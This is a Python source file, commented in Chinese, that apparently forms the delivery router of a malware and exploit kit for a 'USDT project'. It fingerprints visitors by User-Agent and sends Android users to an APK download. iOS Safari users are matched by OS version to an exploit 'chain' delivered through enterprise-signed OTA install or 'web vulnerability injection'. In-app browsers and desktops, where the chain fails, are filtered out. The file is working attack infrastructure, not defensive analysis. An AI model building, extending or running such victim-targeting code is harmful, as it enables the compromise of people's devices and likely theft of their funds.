#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
delivery_router.py —— 双平台投递分流器（USDT项目 · 线 3）

★ 定位：把「一个请求」映射为「该投什么、投给谁、怎么投」。
  组合三层判据（这三层此前各自存在，但**从未被组合**）：
    1. 平台层：iOS / Android / 桌面（本文件）
    2. 版本层：iOS 具体版本 → 哪条链（resolve_payload_set.py，与 chain-router.js 同源）
    3. 渠道层：Host → 渠道（Node 侧 existing，见 landing.js 的 resolveLandingTemplate）

★ 设计依据：
  - 平台判据复用 pjuyr 样本的三常量（`o5n6_landing.html:1005-1008`），
    见 `09-docs/spec/ios-platform-branch-fixture.md`；
  - 版本判据复用本项目 `chain-router.js`（经 `resolve_payload_set.py` 的 Python 镜像）；
  - 分流决策表见《三项能力对比与整合方案_执行终端版.md》§四 线 3。

★ 与样本的【有意差异】（不是 bug，是决策）：
  样本用 `IS_IOS || IS_SAFARI` 判"显示 iOS 引导" ⇒ macOS Safari 会误入 iOS 分支。
  本实现**默认改为严格 `IS_IOS`**（`strict_ios=True`），因为本项目 iOS 分支的后续动作是
  「网页漏洞注入」，在 macOS 上**无意义且会失败**。
  可用 `strict_ios=False` 回到样本行为（供夹具比对）。

用法：
  python delivery_router.py --ua "<UA>"                    # 单条判定
  python delivery_router.py --ua "<UA>" --json
  python delivery_router.py --selftest                     # 跑夹具回归
"""

import argparse
import json
import os
import re
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

from resolve_payload_set import (  # noqa: E402
    pick_chain, parse_ios_version, explain_unsupported,
)

FIXTURE = os.path.join(
    os.path.dirname(_HERE), "..", "09-docs", "spec", "platform_branch_fixture.json"
)

# ---------------------------------------------------------------------------
# 平台判定（★ 判据同源于样本 o5n6_landing.html:1005-1008）
# ---------------------------------------------------------------------------
_RE_IOS = re.compile(r"iPad|iPhone|iPod", re.I)
_RE_ANDROID = re.compile(r"Android", re.I)
_RE_NON_SAFARI = re.compile(
    r"Chrome|Chromium|EdgiOS|OPR|Opera|Firefox|UMEBrowser|UCBrowser|SamsungBrowser|MQQBrowser",
    re.I,
)


def is_ios(ua):
    return bool(_RE_IOS.search(ua or ""))


def is_android(ua):
    return bool(_RE_ANDROID.search(ua or ""))


def is_safari(ua):
    ua = ua or ""
    return ("Safari" in ua) and ("Version" in ua) and (not _RE_NON_SAFARI.search(ua))


def device_kind(ua):
    """四态：ios / android / mobile / desktop（语义同 prtvxx 的 deviceKind）。"""
    if is_ios(ua):
        return "ios"
    if is_android(ua):
        return "android"
    if re.search(r"mobile|windows phone", ua or "", re.I):
        return "mobile"
    return "desktop"


# ---------------------------------------------------------------------------
# 分流决策
# ---------------------------------------------------------------------------
def route(ua, config=None, strict_ios=True):
    """
    把 UA 映射为投递决策。

    config（可选，模拟 prtvxx 的 access.* 配置面）：
      {
        "allow_android": true, "allow_ios": true, "allow_desktop": false,
        "block_in_app": true, "blocked_redirect_url": "...",
        # 渠道侧：
        "ios_manifest_url": "https://.../api/ipa/manifest.plist?id=...",
        "android_apk_url": "/api/apk/download",
        "channel": "xxx", "host": "..."
      }

    返回 dict：
      { platform, device_kind, delivery, url, reason, blocked, chain_info }
    """
    cfg = config or {}
    kind = device_kind(ua)
    in_app = bool(re.search(r"FBAN|FBAV|Instagram|MicroMessenger|QQ/|Line/", ua or "", re.I))

    out = {
        "platform": kind,
        "device_kind": kind,
        "is_ios": is_ios(ua),
        "is_android": is_android(ua),
        "is_safari": is_safari(ua),
        "in_app": in_app,
        "delivery": None,
        "url": None,
        "blocked": False,
        "reason": "",
        "chain_info": None,
    }

    # ---- 桌面：默认不投递 ----
    if kind == "desktop":
        if cfg.get("allow_desktop"):
            out["delivery"] = "fallback"
            out["url"] = cfg.get("blocked_redirect_url") or "/"
            out["reason"] = "desktop allowed by config"
        else:
            out["blocked"] = True
            out["reason"] = "桌面端不投递（allow_desktop=false）"
        return out

    # ---- Android ----
    if kind == "android":
        if cfg.get("allow_android") is False:
            out["blocked"] = True
            out["reason"] = "Android 被封禁（allow_android=false）"
            return out
        out["delivery"] = "apk"
        out["url"] = cfg.get("android_apk_url") or "/api/apk/download"
        out["reason"] = "Android → APK 直下（复用既有 landing.js 端点）"
        return out

    # ---- iOS ----
    # 1) InApp 拦截（★ 样本行为：InApp 一律阻断，因描述文件/漏洞链在 InApp WebView 不可用）
    if cfg.get("block_in_app", True) and in_app:
        out["blocked"] = True
        out["reason"] = "InApp 浏览器（FB/IG/微信等）内阻断 —— 后续链在 InApp WebView 不可用"
        return out

    # 2) Safari 门禁（★ 样本行为：非 Safari 弹"请用 Safari"）
    if not is_safari(ua):
        out["blocked"] = True
        out["reason"] = "非 Safari 浏览器 → 提示改用 Safari（样本 o5n6_landing.html:1185-1188 同义）"
        return out

    # 3) ★ 严格 iOS 判定（本项目决策：macOS Safari 不投 iOS 链）
    if strict_ios and not is_ios(ua):
        out["blocked"] = True
        out["reason"] = "macOS/非 iOS 的 Safari —— 不投 iOS 链（本实现在此与样本不同，见文件头）"
        return out

    if cfg.get("allow_ios") is False:
        out["blocked"] = True
        out["reason"] = "iOS 被封禁（allow_ios=false）"
        return out

    # 4) ★ 版本层判定（与 chain-router.js 同源）
    route_info = pick_chain(ua)
    if not route_info:
        v = parse_ios_version(ua)
        out["delivery"] = "unsupported"
        out["chain_info"] = None
        out["reason"] = explain_unsupported(v)
        return out

    # 5) 交付方式：OTA 有 manifest 则走 OTA，否则走网页注入
    out["chain_info"] = route_info
    if cfg.get("ios_manifest_url"):
        out["delivery"] = "ota"
        out["url"] = (
            "itms-services://?action=download-manifest&url="
            + cfg["ios_manifest_url"]
        )
        out["reason"] = (
            f"iOS {'.'.join(map(str, route_info['version']))} → 链 {route_info['chain']}"
            f"（build={route_info['build']}）→ 企业签名 OTA"
        )
    else:
        out["delivery"] = "web-inject"
        out["url"] = cfg.get("ios_inject_url") or "/details/show.html"
        out["reason"] = (
            f"iOS {'.'.join(map(str, route_info['version']))} → 链 {route_info['chain']}"
            f"（build={route_info['build']}）→ 网页注入"
        )
    return out


# ---------------------------------------------------------------------------
# 自测：跑夹具
# ---------------------------------------------------------------------------
def selftest():
    if not os.path.isfile(FIXTURE):
        print(f"[FAIL] 夹具不存在：{FIXTURE}")
        return 1

    with open(FIXTURE, "r", encoding="utf-8") as f:
        fx = json.load(f)

    passed = failed = 0

    print("=== 平台层夹具（比对样本行为）===")
    for c in fx["cases"]:
        ua = c["ua"]
        exp = c["expected"]
        got = {
            "is_ios": is_ios(ua),
            "is_android": is_android(ua),
            "is_safari": is_safari(ua),
        }
        # ★ 样本语义（o5n6_landing.html）：
        #   - 分支开关：`if (IS_IOS || IS_SAFARI) 显示 ios-step`
        #   - 但**前置拦截**：`if (IS_IOS && !IS_SAFARI) { 弹错; return; }`
        #     ⇒ 被拦截时**根本不进入显示分支** ⇒ shows_ios_guide = false。
        #   ★ 初版自测漏了拦截前置，被夹具抓出（这正是夹具的价值）。
        blocked = got["is_ios"] and not got["is_safari"]
        got["blocked"] = blocked
        got["shows_ios_guide"] = (got["is_ios"] or got["is_safari"]) and not blocked
        ok = all(got[k] == exp[k] for k in ("is_ios", "is_android", "is_safari",
                                            "shows_ios_guide", "blocked"))
        tag = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        else:
            failed += 1
        print(f"  [{tag}] {c['id']:16s} ios={got['is_ios']!s:5s} "
              f"android={got['is_android']!s:5s} safari={got['is_safari']!s:5s} "
              f"blocked={blocked!s:5s} guide={got['shows_ios_guide']!s:5s} "
              f"(期望 blocked={exp['blocked']} guide={exp['shows_ios_guide']})")

    print("\n=== 版本层夹具（chain-router 同源）===")
    for c in fx["extra_chain_cases"]["cases"]:
        v = c["ios"]
        parts = v.split(".")
        while len(parts) < 3:
            parts.append("0")
        os_tag = "_".join(parts[:3])
        ua = (f"Mozilla/5.0 (iPhone; CPU iPhone OS {os_tag} like Mac OS X) "
              f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
              f"Version/{v} Mobile/15E148 Safari/604.1")
        r = pick_chain(ua)
        if c["expect_ok"]:
            ok = r is not None and r["chain"] == c["expect_chain"]
            if ok and c.get("expect_build"):
                ok = r["build"] == c["expect_build"]
            detail = f"chain={r['chain'] if r else None} build={r['build'] if r else None}"
        else:
            ok = r is None
            detail = f"chain={r['chain'] if r else None}"
        tag = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        else:
            failed += 1
        print(f"  [{tag}] iOS {v:8s} -> {detail}")

    print(f"\n=== 合计：PASS={passed}  FAIL={failed} ===")
    return 0 if failed == 0 else 1


def main():
    ap = argparse.ArgumentParser(description="双平台投递分流器（线 3）")
    ap.add_argument("--ua", help="User-Agent")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--strict-ios", action="store_true",
                    help="严格 iOS（macOS Safari 不投 iOS 链；默认关闭以比对样本）")
    ap.add_argument("--selftest", action="store_true", help="跑夹具回归")
    args = ap.parse_args()

    if args.selftest:
        return selftest()
    if not args.ua:
        ap.error("须给 --ua 或 --selftest")

    r = route(args.ua, strict_ios=args.strict_ios)
    if args.json:
        print(json.dumps(r, ensure_ascii=False, indent=2))
    else:
        print(f"设备        : {r['device_kind']} (ios={r['is_ios']} android={r['is_android']} safari={r['is_safari']})")
        print(f"投递方式    : {r['delivery']}")
        print(f"目标 URL    : {r['url']}")
        print(f"阻断        : {r['blocked']}")
        print(f"原因        : {r['reason']}")
        if r["chain_info"]:
            ci = r["chain_info"]
            print(f"链          : {ci['chain']} (build={ci['build']}, reach={ci['reach']})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
